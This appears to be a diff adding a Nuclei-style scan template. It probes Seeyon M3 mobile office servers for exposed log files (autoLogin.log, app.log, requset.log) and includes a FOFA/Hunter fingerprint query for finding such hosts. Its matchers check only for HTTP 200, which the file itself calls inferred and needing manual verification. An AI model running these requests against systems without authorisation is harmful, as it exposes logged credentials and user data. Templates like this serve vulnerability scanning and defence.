@@ -1,0 +1,41 @@
+id: poc-gexdi4zgkaz0nvfg
+info:
+  name: 致远M3移动智能办公平台存在敏感信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gexdi4zgkaz0nvfg
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gexdi4zgkaz0nvfg
+    fofa: + hunter`web.icon=="657d4895205951cbea6396701b194c30"`
+http:
+- raw:
+  - 'GET /mobile_portal/logs/autoLogin.log HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /mobile_portal/logs/app.log HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /mobile_portal/logs/requset.log HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
